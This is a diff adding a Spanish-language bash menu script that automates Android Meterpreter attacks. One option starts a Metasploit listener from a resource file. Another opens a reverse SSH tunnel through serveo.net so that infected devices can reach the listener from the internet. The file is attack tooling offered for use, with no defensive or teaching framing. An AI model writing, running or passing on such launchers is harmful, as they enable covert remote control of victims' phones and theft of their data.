@@ -1,0 +1,51 @@
+#!/bin/bash
+C='\033[1;36m'
+G='\033[1;32m'
+R='\033[1;31m'
+Y='\033[1;33m'
+B='\033[1;34m'
+P='\033[1;35m'                                                        RE='\033[0m'
+function reiniciar {
+	echo $(clear)
+	cd $HOME
+	bash bot
+}
+function banner {
+	echo $(clear)
+	bash txt
+printf "$G BOT $Y LX $R v2.0.0 $W"
+}
+banner
+echo
+printf "$Y 3 OPCIONES PARA UTILIZAR (2) SESSIONES $C
+1) $G ACTIVAR ANDROID METERPRETER HACKING WAITING...(1 SESSION) $C
+2)$G  ACTIVAR SERVIDOR SERVEO PARA CONEXION (2 SESSION)... $C
+3) $G MANUAL HACKING BASICO DE MESTASPLOIT.... $C
+4) $G LLAMAR A FT PARA OPCIONES HACKING $C
+0)$R  Salir....$G
+"
+read -p " >>> " op
+case $op in
+	1)
+		echo
+		printf "$Y ADVERTENCIA!!! ESPERA QUE INICIE COMPLETO LUEGO USA LA OPCION 2 EN OTRA SESSION!!!\n$G"
+		echo
+		cd java && msfconsole -r *rc*
+		reiniciar
+		;;
+	2)
+		echo
+		printf "$G ABRIENDO PUERTAS ESCUCHANTE DEL PAYLOAD\n"
+		autossh -M 0 -R 7728:127.0.0.1:7767 serveo.net
+		reiniciar
+		;;
+	4)
+		FT
+		reiniciar
+		;;
+	0)
+		exit
+		;;
+
+esac
+
